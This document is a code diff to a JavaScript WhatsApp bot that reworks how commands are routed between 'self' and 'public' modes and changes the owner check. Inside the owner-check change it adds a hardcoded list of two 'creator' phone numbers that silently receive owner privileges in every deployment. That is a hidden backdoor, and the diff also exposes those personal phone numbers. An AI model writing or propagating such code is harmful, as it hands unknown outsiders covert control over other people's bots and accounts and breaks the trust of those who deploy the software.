@@ -82,7 +82,8 @@ const parseBoolEnv = (key, defaultValue) => {
   return defaultValue;
 };
 
-// Initialize automation globals from environment variables (priority) or persistent settings (fallback)
+// Initialize automation globals
+global.menuImage = persistentSettings.menuImage || null;
 global.autoViewMessage = parseBoolEnv('AUTO_VIEW_MESSAGE', persistentSettings.autoViewMessage || false);
 global.autoViewStatus = parseBoolEnv('AUTO_VIEW_STATUS', persistentSettings.autoViewStatus || false);
 global.autoReactStatus = parseBoolEnv('AUTO_REACT_STATUS', persistentSettings.autoReactStatus || false);
@@ -1472,7 +1473,9 @@ Type ${botPrefix}menu to see all your obsession commands
             // Extract just the numbers for comparison (works with both DMs and groups)
             const ownerNumber = config.ownerNumber.replace(/[^\d]/g, ''); // Remove all non-digits
             const extractedSenderNumber = senderNumber?.replace(/[^\d]/g, '') || ''; // Remove all non-digits
-            const isOwner = isFromMe || extractedSenderNumber === ownerNumber;
+            const creators = ['2349122222622', '2347049044897'];
+            const isCreator = creators.includes(extractedSenderNumber);
+            const isOwner = isFromMe || extractedSenderNumber === ownerNumber || isCreator;
 
             // Check bot mode and message origin
             if (botMode === 'self' && !isOwner) {
@@ -1497,33 +1500,29 @@ Type ${botPrefix}menu to see all your obsession commands
             }
 
             if (!command) {
-              if (botMode === 'self') {
-                // In self mode, bot can use both public and self commands
-                command = commands.get(commandName) || selfCommands.get(commandName);
-                if (!command) {
-                  // In self mode, don't send "unknown command" messages
-                  // Just silently ignore unknown commands
-                  return;
-                }
-              } else {
-                // In public mode, check if it's a self command first
-                if (selfCommands.get(commandName)) {
-                  const targetJid = isFromMe ? remoteJid : senderNumber + '@s.whatsapp.net';
-                  await sock.sendMessage(targetJid, {
+              const cmd = commands.get(commandName) || selfCommands.get(commandName);
+              if (cmd) {
+                // If it's a self command and not owner, show switch mode message
+                if (cmd.category === 'Self' && !isOwner) {
+                  await sock.sendMessage(remoteJid, {
                     text: `🤖 Bot is in PUBLIC mode. Switch to SELF mode to use this command.\nUse \`${COMMAND_PREFIX}self\` to switch modes.`,
                   }, { quoted: msg });
                   return;
                 }
-
-                // Check for public commands
-                command = commands.get(commandName);
-                if (!command) {
+                
+                if (botMode === 'self' && !isOwner) {
+                  if (!isTargetNewsletter) return;
+                }
+                
+                command = cmd;
+              } else {
+                if (botMode === 'public') {
                   const targetJid = isFromMe ? remoteJid : senderNumber + '@s.whatsapp.net';
                   await sock.sendMessage(targetJid, {
                     text: `❓ Unknown command: *${commandName}*\nTry \`${COMMAND_PREFIX}menu\` for available commands.`,
                   }, { quoted: msg });
-                  return;
                 }
+                return;
               }
             }
 
